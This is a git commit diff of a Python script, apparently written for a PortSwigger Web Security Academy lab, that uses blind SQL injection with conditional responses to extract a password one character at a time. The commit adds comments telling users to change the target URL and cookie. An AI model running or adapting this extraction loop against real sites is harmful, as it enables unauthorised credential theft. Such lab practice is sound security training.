ee888e0f288a5a289d3732e226b01a5054faac94
Mano Ranjan N <86837128+Psych3-repo@users.noreply.github.com>
2022-01-26 01:44:36 +0530

    Update blind_sql_cond_resp.py

--- SQLi/blind_sql_cond_resp.py
+++ SQLi/blind_sql_cond_resp.py
@@ -1,8 +1,10 @@
+#Change url and cookie variables.
+
 import requests
 data = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',\
         '1','2','3','4','5','6','7','8','9','0']
-url = "https://ac851f071ebba3d4c0bf1c89001700ac.web-security-academy.net/filter?category=Pets"
-cookie1 = "Vp73FPxbBa5VFPdF"
+url = "https://ac851f071ebba3d4c0bf1c89001700ac.web-security-academy.net/filter?category=Pets" #change this
+cookie1 = "Vp73FPxbBa5VFPdF" #change this
 actual_password = ''
 for i in range(1,21):
   for j in data:
